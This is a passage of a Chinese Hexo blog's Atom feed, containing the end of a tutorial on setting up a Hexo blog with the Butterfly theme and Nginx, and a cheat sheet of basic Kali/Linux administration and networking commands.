class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h1 id="二，开始安装hexo"><a href="#二，开始安装hexo" class="headerlink" title="二，开始安装hexo"></a>二，开始安装hexo</h1><p>使用下面的命令在终端管理员中运行，注意需要管理员权限。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">或者</span><br><span class="line">cnpm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>选择你的博客目录，右键打开终端，创建一个项目 <code>hexo-blog</code>（你的博客名称） 并初始化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init hexo-blog</span><br><span class="line">cd hexo-blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>生成静态网页，并启动本地服务，可以在终端中输入，也可以在git bash中输入，但一定要在博客的根目录下打开。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>浏览器地址栏输入 <a href="http://localhost,页面默认主图风格如下,实现了本地访问./">http://localhost，页面默认主图风格如下，实现了本地访问。</a></p><img src="https://img-blog.csdnimg.cn/656bf025f6934a35abc104b16e4dd2fc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhb3JvbmdrZQ==,size_16,color_FFFFFF,t_70" style="zoom: 50%;" /><h1 id="三，更换主题"><a href="#三，更换主题" class="headerlink" title="三，更换主题"></a>三，更换主题</h1><p>自带的主题太难看，hexo有众多的主题，选择一个美观的主题<a href="https://hexo.io/themes/">(点我)</a>并下载下来。</p><p>推荐butterfly主题，</p><p>1，通过git安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://gitee.com/iamjerryw/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>2，手动安装</p><p>下载好压缩包后，将其解压，并将解压好的文件夹，放在博客根目录下的themes文件夹下，在通过notepad++修改配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">theme: landscape     <span class="comment"># 这个是默认的主题，需要注释掉，添加新的主题</span></span></span><br><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><p>具体的操作过程可以参考下面的文章，</p><p><a href="https://blog.csdn.net/qq_38157825/article/details/112782828">Butterfly主题安装文档(一)之快速开始</a></p><p><a href="https://mepha.top/posts/Butterfly%E4%B8%BB%E9%A2%98%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/index.html">Butterfly安装教程</a></p><h1 id="四，云服务器配置"><a href="#四，云服务器配置" class="headerlink" title="四，云服务器配置"></a>四，云服务器配置</h1><h2 id="云服务器"><a href="#云服务器" class="headerlink" title="云服务器"></a>云服务器</h2><p>需要拥有一台自己的云服务器，可以自行查找资料选购，尽量选择香港的，不然还要备案，麻烦。</p><p>我使用的<a href="https://www.鑫来利.cn/service?groupid=305">云服务器 | 阿文云计算</a>，如果你选择部署在github page上，参考这篇文章<a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">hexo史上最全搭建教程-CSDN博客</a>，hexo部署，github托管，就是访问部署的博客需要科学上网，但是可以通过 <a href="https://vercel.com/">Vercel</a>免费加速，效果可以。</p><p>选择好服务器后，使用xshell7和xftp7连接云服务器，如果不会操作或遇到问题可以参考这些文章，</p><p><a href="https://blog.csdn.net/qq_44847147/article/details/104737763">Xshell怎么与云服务器连接(详细过程)</a></p><p><a href="https://blog.csdn.net/m0_52452585/article/details/123766668">解决Xshell7远程连接失败（connection failed）的问题</a></p><h2 id="安装并配置Nginx"><a href="#安装并配置Nginx" class="headerlink" title="安装并配置Nginx"></a>安装并配置Nginx</h2><p>首先更新源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获得源上的软件包列表信息</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新本地软件</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get upgrade</span></span><br></pre></td></tr></table></figure><p>修改配置文件</p><p>我们可以看到<code>/etc/nginx/</code>目录下的文件</p><p><img src="https://img-blog.csdnimg.cn/e7965bea41a34ccc982d7a4450f7fd76.png"></p><p>正常来说应该是 nginx.conf 这个文件，我们编辑它：</p><h2 id="Git仓库"><a href="#Git仓库" class="headerlink" title="Git仓库"></a>Git仓库</h2><h1 id="五，问题解决："><a href="#五，问题解决：" class="headerlink" title="五，问题解决："></a>五，问题解决：</h1><ol><li><p>nginx中文路径乱码</p><p><a href="https://blog.csdn.net/weixin_45545395/article/details/124905984">https://blog.csdn.net/weixin_45545395/article/details/124905984</a></p></li><li><p>服务器选取</p></li></ol><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ul><li>Ubuntu部署（需要租赁云服务器）</li></ul><p>​<a href="https://cnhuazhu.gitee.io/2021/10/12/%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88Ubuntu%EF%BC%89/Hexo%E9%83%A8%E7%BD%B2%E8%87%B3%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88Ubuntu-20-04%EF%BC%89/">Hexo部署至服务器（Ubuntu 20.04） | 花猪のBlog</a></p><p>​<a href="https://zhuanlan.zhihu.com/p/120743882">将hexo个人博客部署到个人云服务器–最详细踩坑教程 - 知乎</a></p><ul><li>部署hexo到nginx</li></ul><p>​<a href="https://zhuanlan.zhihu.com/p/158678677">https://zhuanlan.zhihu.com/p/158678677</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="建站" scheme="http://li-yian.site/tags/%E5%BB%BA%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>kali的常用命令</title>
    <link href="http://li-yian.site/2023/12/10/kali%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://li-yian.site/2023/12/10/kali%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2023-12-10T06:50:46.000Z</published>
    <updated>2023-12-16T05:32:28.955Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a>1.常用命令</h2><p>passwd 修改密码</p><p>passwd root 修改root用户密码</p><p>date 显示系统日期</p><p>sudo 后面加命令 就可以调用管理权限</p><p>apt-get update 更新软件列表</p><p>这个命令，会访问源列表里的每个网址，并读取软件列表，然后保存在本地电脑。我们在新立得软件包管理器里看到的软件列表，都是通过update命令更新的。</p><p>apt-get upgrade 更新软件</p><p>这个命令，会把本地已安装的软件，与刚下载的软件列表里对应软件进行对比，如果发现已安装的软件版本太低，就会提示你更新。如果你的软件都是最新版本，会提示： 升级了 0 个软件包，新安装了 0 个软件包，要卸载 0 个软件包，有 0 个软件包未被升级。</p><p>apt-get dist-upgrade 更新软件  </p><p>apt-get upgrade 与 apt-get dist-upgrade 的区别</p><p>upgrade:系统将现有的Package升级,如果有相依性的问题,而此相依性需要安装其它新的Package或影响到其它Package的相依性时,此Package就不会被升级,会保留下来.</p><p>dist-upgrade:可以聪明的解决相依性的问题,如果有相依性问题,需要安装&#x2F;移除新的Package,就会试着去安装&#x2F;移除它.<br>(所以通常这个会被认为是有点风险的升级)</p><p>apt-get upgrade 和 apt-get dist-upgrade 本质上是没有什么不同的。</p><p>只不过，dist-upgrade<br>会识别出当依赖关系改变的情形并作出处理，而upgrade对此情形不处理。</p><p>例如软件包 a 原先依赖 b c d，但是在源里面可能已经升级了，现在是 a 依赖 b c e。这种情况下，dist-upgrade 会删除 d 安装 e，并把 a 软件包升级，而 upgrade 会认为依赖关系改变而拒绝升级 a<br>软件包。</p><p>clear 清屏</p><p>sudo gpedit 特权调用gpedit编辑器</p><p>reboot 重启</p><p>apt-get install XXXXX 安装缺少的依赖包，（XXX）里面输入缺少依赖包的名字</p><p>apt-get autoremove –purge 软件名 删除包及其依赖的软件包+配置文件等</p><p>apt-get install +模块名 这种方法也可以安装模块,或者apt-get install python-模块名</p><p>firefox 浏览器打开</p><p>shutdown -h now 关闭系统(1)</p><p>init 0 关闭系统(2)</p><p>telinit 0 关闭系统(3)</p><p>shutdown -h hours:minutes &amp; 按预定时间关闭系统</p><p>shutdown -c 取消按预定时间关闭系统</p><p>shutdown -r now 重启(1)</p><p>reboot 重启(2)</p><p>su -l 切换登陆用户</p><p>logout 注销用户登陆</p><p>pwd 当前路径</p><h2 id="2-文件夹或文本操作"><a href="#2-文件夹或文本操作" class="headerlink" title="2.文件夹或文本操作"></a>2.文件夹或文本操作</h2><p>cd .. 返回上一级目录</p><p>cd ..&#x2F;.. 返回上级两级目录</p><p>cd - 返回上次所在的目录</p><p>cd 文件夹名  进去文件夹</p><p>cd ~ 进去当前用户主目录</p><p>pwd 显示当前工作路径</p><p>touch 文件名  常见文件</p><p>cat 文件名 读取文档内容</p><p>mkdir 文件名 创建文件夹</p><p>mkdir -p 文件夹 递归创建文件夹</p><p>cp 复制命令</p><p>cp -r moon moons 复制moon 文件夹到当前 moons 如果有里面有文件 使用-r </p><p>mv 移动命令</p><p>mv moon moon 也可以说是改名</p><p>mkdir 文件名 文件名 创建多个文件夹</p><p>ls 显示文件和文件夹名</p><p>ls -a 显示所有的文件和文件夹 包含隐藏文件</p><p>ls -l 显示文件和目录的详细资料</p><p>删除</p><p>rm -f 文件  删除文件</p><p>rm 文件夹名 删除文件夹</p><p>rm -rf  文件&#x2F;文件夹  删除文件夹 及其目录下的文件</p><p>压缩和解压<br>bzip2 file1 压缩一个叫做 ‘file1’ 的文件</p><p>gunzip file1.gz 解压一个叫做 ‘file1.gz’的文件</p><p>gzip file1 压缩一个叫做 ‘file1’的文件</p><p>gzip -9 file1 最大程度压缩</p><p>rar a file1.rar test_file 创建一个叫做 ‘file1.rar’ 的包</p><p>rar x file1.rar 解压rar包</p><p>unrar x file1.rar 解压rar包</p><p>DEB 包 (Debian, Ubuntu 以及类似系统)<br>dpkg -i package.deb 安装&#x2F;更新一个 deb 包</p><p>dpkg -r package_name 从系统删除一个 deb 包</p><p>dpkg -l 显示系统中所有已经安装的 deb 包</p><p>dpkg -l | grep httpd 显示所有名称中包含 “httpd” 字样的deb包</p><p>dpkg -s package_name 获得已经安装在系统中一个特殊包的信息</p><p>dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表</p><p>dpkg –contents package.deb 显示尚未安装的一个包所提供的文件列表</p><p>tar zcvf +压缩文件名 压缩文件</p><p>tar zxvf +解压包名 解压文件</p><p>tar -jcvf renwolesshel.tar.bz2 打包</p><p>tar jxvf renwolesshel.tar.bz2 解压</p><p>压缩成zip格式</p><p>zip -q -r renwolesshel.zip renwolesshel&#x2F;<br>解压zip格式的压缩包</p><p>unzip renwolesshel.zip</p><p>which 加软件名 可以查出软件目录在哪</p><p>.&#x2F;+文件名或者apt-get +文件名 安装文件</p><h2 id="3-系统信息"><a href="#3-系统信息" class="headerlink" title="3.系统信息"></a>3.系统信息</h2><p>arch 显示机器的处理器架构(1)</p><p>uname -m 显示机器的处理器架构(2)</p><p>uname -r 显示正在使用的内核版本</p><p>cat &#x2F;proc&#x2F;version 显示内核的版本</p><p>cat &#x2F;proc&#x2F;net&#x2F;dev 显示网络适配器及统计</p><p>cat &#x2F;proc&#x2F;cpuinfo 显示CPU info的信息</p><p>cat &#x2F;proc&#x2F;mounts 显示已加载的文件系统</p><h2 id="4-vi-常用命令"><a href="#4-vi-常用命令" class="headerlink" title="4.vi 常用命令"></a>4.vi 常用命令</h2><h2 id="vi编辑器的概念"><a href="#vi编辑器的概念" class="headerlink" title="vi编辑器的概念"></a>vi编辑器的概念</h2><p>vi编辑器分为三种状态，分别是：<br>1.命令模式（command mode）<br>控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。</p><p>2.插入模式（Insert mode）</p><p>只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。</p><p>3.底行模式（last line mode）</p><p>将文件保存或退出vi，也可以设置编辑环境，如寻找字符串、列出行号……等。</p><p><strong>打开</strong></p><p>vi filename :打开或新建文件，并将光标置于第一行首<br>vi +n filename ：打开文件，并将光标置于第n行首<br>vi + filename ：打开文件，并将光标置于最后一行首</p><p><strong>编辑</strong></p><p>i 在当前位置生前插入<br>I 在当前行首插入<br>a 在当前位置后插入<br>A 在当前行尾插入<br>o 在当前行之后插入一行<br>O 在当前行之前插入一行<br>编辑结束，按Esc返回命令模式</p><p><strong>基本查找</strong></p><p>&#x2F;text　　查找text，按n健查找下一个，按N健查找前一个。<br>?text　　查找text，反向查找，按n健查找下一个，按N健查找前一个。<br>查找很长的词，如果一个词很长，键入麻烦，可以将光标移动到该词上，按*或#键即可以该单词进行搜索，相当于&#x2F;搜索。而#命令相当于?搜索。</p><p><strong>删除</strong></p><p>删除当前行 dd<br>删除2行 2dd</p><p><strong>拷贝和粘贴</strong></p><p>yy 拷贝当前行<br>nyy 拷贝当前后开始的n行，比如2yy拷贝当前行及其下一行。<br>p  在当前光标后粘贴</p><p>区块拷贝</p><ol><li>将光标移动到要复制的文本开始的地方，按 v进入可视模式。</li><li>将光标移动到要复制的文本的结束的地方，按y复制。此时vim会自动将光标定位到选中文本的开始的地方，并退出可视模式。</li><li>我移动光标到文本结束的地方，按 p粘贴。</li></ol><p><strong>退出命令</strong></p><p>:wq 保存并退出<br>:q! 强制退出并忽略所有更改<br>:e! 放弃所有修改，并打开原来文件<br>:w保存修改</p><p><strong>显示行号</strong></p><p>set number</p><p>set nu</p><p>输入:n，代表跳转到第n行，如:100，就跳转到第100行。</p><p>撤销操作</p><p>u</p><p>vim与vi的区别</p><p>vim是vi的延申 vim编辑源码会高亮 vim的命令对vi是完全兼容的</p><h2 id="5-文件搜索"><a href="#5-文件搜索" class="headerlink" title="5.文件搜索"></a>5.文件搜索</h2><p>find &#x2F; -name file1 从 ‘&#x2F;’ 开始进入根文件系统搜索文件和目录</p><p>find &#x2F; -user user1 搜索属于用户 ‘user1’ 的文件和目录<br>find &#x2F;home&#x2F;user1 -name *.bin 在目录 ‘&#x2F; home&#x2F;user1’ 中搜索带有’.bin’ 结尾的文件<br>find &#x2F;usr&#x2F;bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件<br>find &#x2F;usr&#x2F;bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件</p><p>find . -name ‘<em>.php’ -mmin -30  查找最近30分钟修改的当前目录下的.php文件<br>find . -name ‘</em>.php’ -mtime 0<br>查找最近24小时修改的当前目录下的.php文件</p><p>find . -name ‘*.inc’ -mtime 0 -ls<br>查找最近24小时修改的当前目录下的.php文件，并列出详细信息</p><p>find . -type f -mtime 1</p><p>查找当前目录下，最近24-48小时修改过的常规文件。<br>find . -type f -mtime +1<br>查找当前目录下，最近1天前修改过的常规文件。</p><p>-atime 文件访问时间</p><p>-ctime 文件常见时间</p><p>-mtime文件修改时间</p><p>-mtime n : n为数字，意思为在n天之前的“一天之内”被更改过内容的文件<br>-mtime +n : 列出在n天之前（不含n天本身）被更改过内容的文件名<br>-mtime -n : 列出在n天之内（含n天本身）被更改过内容的文件名</p><p>-type f 代表一个普通格式的文件 二进制文件</p><p>-type d 代表文件夹</p><p>find &#x2F; -name *.rpm -exec chmod 755 ‘{}’ ; 搜索以 ‘.rpm’ 结尾的文件并定义其权限<br>find &#x2F; -xdev -name *.rpm 搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备<br>locate *.ps 寻找以 ‘.ps’ 结尾的文件 - 先运行 ‘updatedb’ 命令<br>whereis halt 显示一个二进制文件、源码或man的位置<br>which halt 显示一个二进制文件或可执行文件的完整路径</p><p>grep kali &#x2F;etc&#x2F;passwd grep关键词搜索</p><p>find &#x2F; -name moonsec 2&gt;&#x2F;dev&#x2F;null   搜索某个文件&#x2F;文件夹 屏蔽出错信息</p><h2 id="6-用户和群组"><a href="#6-用户和群组" class="headerlink" title="6.用户和群组"></a>6.用户和群组</h2><p>groupadd group_name 创建一个新用户组<br>groupdel group_name 删除一个用户组</p><p>cat &#x2F;etc&#x2F;group | grep group_name </p><p>usermod -a -G moontea k1把用户k1附加其他用户组</p><p>创建目录</p><p>useradd moonsec</p><p>passwd moonsec</p><p>创建用户以及分配目录</p><p>useradd -r -m -s &#x2F;bin&#x2F;bash moonsec</p><p>参数的意思：<br>-r 建立系统账号<br>-m 自动建立用户的登入目录<br>-s &#x2F;bin&#x2F;bash 指定用户登入后所使用的shell</p><p>切换用户</p><p>su - root 切换到root用户</p><p>su 用户名 切换到普通用户</p><h2 id="7-系统管理"><a href="#7-系统管理" class="headerlink" title="7.系统管理"></a>7.系统管理</h2><p>top</p><p>查看正在指向的程序信息</p><p>进程</p><p>ps -ef 查看所有进程信息</p><p>ps -ef | grep tomcat 查找指定进程</p><p>kill -9 id 强制杀死进程</p><p>env 当前的变量</p><p>查看系统变量</p><p>echo $PATH</p><p>hostname 查看主机名</p><p>history 查看历史命令</p><h2 id="8-查看磁盘信息"><a href="#8-查看磁盘信息" class="headerlink" title="8.查看磁盘信息"></a>8.查看磁盘信息</h2><p>df   默认不带单位，挂载点、总容量、已用、可用</p><p>df  -h   友好显示（带单位），很多命令的友好显示都是-h</p><h2 id="9-查看内存信息"><a href="#9-查看内存信息" class="headerlink" title="9.查看内存信息"></a>9.查看内存信息</h2><p>free   默认以KB为单位，总容量、已用、可用、缓存大小</p><p>free  -m   默认以MB为单位</p><p>free  -h   上面2种都不带单位、只显示数值，这种是友好显示的，会带单位G、M等</p><h2 id="10-查看环境变量"><a href="#10-查看环境变量" class="headerlink" title="10.查看环境变量"></a>10.查看环境变量</h2><p>echo  $JAVA_HOME<br>echo $PATH | grep jdk</p><h2 id="11开机自启"><a href="#11开机自启" class="headerlink" title="11开机自启"></a>11开机自启</h2><p>有很多程序往往都需要设置开机自启，比如tomcat、mysql、nginx等。</p><p>在&#x2F;etc&#x2F;rc.d&#x2F;rc.local文件中加入开机要自动执行的程序</p><p>vim &#x2F;etc&#x2F;rc.d&#x2F;rc.local</p><p>挂载一个windows网络共享</p><p>mount -t smbfs -o username&#x3D;user,password&#x3D;pass &#x2F;&#x2F;WinClient&#x2F;share &#x2F;mnt&#x2F;share </p><h2 id="12网卡配置"><a href="#12网卡配置" class="headerlink" title="12网卡配置"></a>12网卡配置</h2><p>vi &#x2F;etc&#x2F;network&#x2F;interfaces</p><p>auto eth0  &#x2F;&#x2F;指定网卡（根据ifconfig结果修改）<br>iface eth0 inet static  &#x2F;&#x2F;启动静态ip<br>address 192.168.0.66  &#x2F;&#x2F; 设置静态ip<br>netmask 255.255.255.0  &#x2F;&#x2F;子网掩码<br>gateway 192.168.0.1  &#x2F;&#x2F;指定网关</p><p>重启网络</p><p>service networking restart<br>或者：<br>systemctl restart networking</p><p>设置临时ip</p><p>ifconfig eth0 192.168.0.33</p><h2 id="13网卡DNS服务器"><a href="#13网卡DNS服务器" class="headerlink" title="13网卡DNS服务器"></a>13网卡DNS服务器</h2><p>vi &#x2F;etc&#x2F;resovl.conf</p><p>nameserver 114.114.114.114</p><p>重启网卡</p><p>service networking restart</p><p>systemctl restart networking</p><p>注意有时候重启才生效</p><h2 id="14-服务相关"><a href="#14-服务相关" class="headerlink" title="14.服务相关"></a>14.服务相关</h2><p>启动apache2服务器</p><p> &#x2F;etc&#x2F;init.d&#x2F;apache2 start</p><p>打开：&#x2F;etc&#x2F;init.d&#x2F;apache2 start<br>重启：&#x2F;etc&#x2F;init.d&#x2F;apache2 restart<br>关闭：&#x2F;etc&#x2F;init.d&#x2F;apache2 stop</p><p>启动网卡</p><p>&#x2F;etc&#x2F;init.d&#x2F;network start</p><p>网络相关</p><p>开启路由转发</p><p>echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</p><h2 id="15-linux常用网络命令"><a href="#15-linux常用网络命令" class="headerlink" title="15.linux常用网络命令"></a><strong>15.linux常用网络命令</strong></h2><p>网络和监控命令类似于这些： hostname, ping, ifconfig, iwconfig, netstat, nslookup, traceroute, finger, telnet, ethtool 用于查看 linux 服务器 ip 地址，管理服务器网络配置，通过 telnet 和 ethernet 建立与 linux 之间的网络链接，查看 linux 的服务器信息等。下面让我们看看在 Linux 下的网络和监控命令的使用。</p><p>hostname 查看本机名</p><p>ping  一般用于测试网络是否通 内网icmp</p><p>ping <a href="http://www.baidu.com/">www.baidu.com</a> -c 3 执行3次</p><p>ifconfig 网卡信息</p><p>iwconfig 用于配置或获取无线网络设备信息</p><p>netstat </p><p>-a (all)显示所有选项，默认不显示LISTEN相关<br>-t (tcp)仅显示tcp相关选项<br>-u (udp)仅显示udp相关选项<br>-n 拒绝显示别名，能显示数字的全部转化成数字。<br>-l 仅列出有在 Listen (监听) 的服務状态</p><p>-p 显示建立相关链接的程序名<br>-r 显示路由信息，路由表<br>-e 显示扩展信息，例如uid等<br>-s 按各个协议进行统计<br>-c 每隔一个固定时间，执行该netstat命令。</p><p>提示：LISTEN和LISTENING的状态只有用-a或者-l才能看到</p><p>常用命令</p><p>netstat -ano</p><p>-an 查看当前所有已连接端口<br>-nlpt 查看当前所有tcp端口<br>-nlpu 查看当前所有udp端口<br>-nlpt | grep 80 查看所有80端口使用情况</p><p>netstat -lntup 查看所有的tcp和upd端口</p><p>nslookup </p><p>查询其他记录<br>直接查询返回的是A记录，我们可以指定参数，查询其他记录，比如AAAA、MX等。</p><p>nslookup -qt&#x3D;type domain [dns-server]<br>其中，type可以是以下这些类型：</p><p>A 地址记录<br>AAAA 地址记录<br>AFSDB Andrew文件系统数据库服务器记录<br>ATMA ATM地址记录<br>CNAME 别名记录<br>HINFO 硬件配置记录，包括CPU、操作系统信息<br>ISDN 域名对应的ISDN号码<br>MB 存放指定邮箱的服务器<br>MG 邮件组记录<br>MINFO 邮件组和邮箱的信息记录<br>MR 改名的邮箱记录<br>MX 邮件服务器记录<br>NS 名字服务器记录<br>PTR 反向记录<br>RP 负责人记录<br>RT 路由穿透记录<br>SRV TCP服务器信息记录<br>TXT 域名对应的文本信息<br>X25 域名对应的X.25地址记录</p><p>http协议</p><p>curl</p><p>wget</p><p>traceroute</p><p>traceroute是用来检测发出数据包的主机到目标主机之间所经过的网关数量的工具。traceroute的原理是试图以最小的TTL（存活时间）发出探测包来跟踪数据包到达目标主机所经过的网关，然后监听一个来自网关ICMP的应答。发送数据包的大小默认为38个字节。</p><p>-d 使用Socket层级的排错功能。<br>-f 设置第一个检测数据包的存活数值TTL的大小。<br>-F 设置勿离断位。<br>-g 设置来源路由网关，最多可设置8个。<br>-i 使用指定的网络界面送出数据包。<br>-I 使用ICMP回应取代UDP资料信息。<br>-m 设置检测数据包的最大存活数值TTL的大小。<br>-n 直接使用IP地址而非主机名称。<br>-p 设置UDP传输协议的通信端口。<br>-r 忽略普通的Routing Table，直接将数据包送到远端主机上。<br>-s 设置本地主机送出数据包的IP地址。<br>-t 设置检测数据包的TOS数值。<br>-v 详细显示指令的执行过程。<br>-w 设置等待远端主机回报的时间。</p><p>-x 开启或关闭数据包的正确性检验。</p><p>telnet</p><p>Linux telnet命令用于远端登入。</p><p>执行telnet指令开启终端机阶段作业，并登入远端主机。</p><p>现在多数用于检测某个端口是否开放</p><p>Finger</p><p>Finger是一种用户信息分享服务。它工作在TCP 79端口，可以用来公开用户的特定信息。Nmap的finger的脚本可以向Finger服务器发送请求，查询并获取用户的相关信息，如登录名、用户名、TTY类型、登录时间等。</p><p>ethtool 是用于查询及设置网卡参数的命令</p><h2 id="16-防火墙iptables"><a href="#16-防火墙iptables" class="headerlink" title="16.防火墙iptables"></a>16.防火墙iptables</h2><p>查看防火墙规则</p><p>iptalbes -L</p><p>清除规则</p><p>iptables -F</p><p>关闭防火墙 </p><p>&#x2F;etc&#x2F;init.d&#x2F;iptables stop</p><p>service iptables stop</p><p>安装：apt-get install ufw</p><p>关闭：ufw disable # To disable the firewall</p><p>开启：ufw enable # To enable the firewall</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://li-yian.site/tags/CTF/"/>
    
  </entry>
  
</feed>
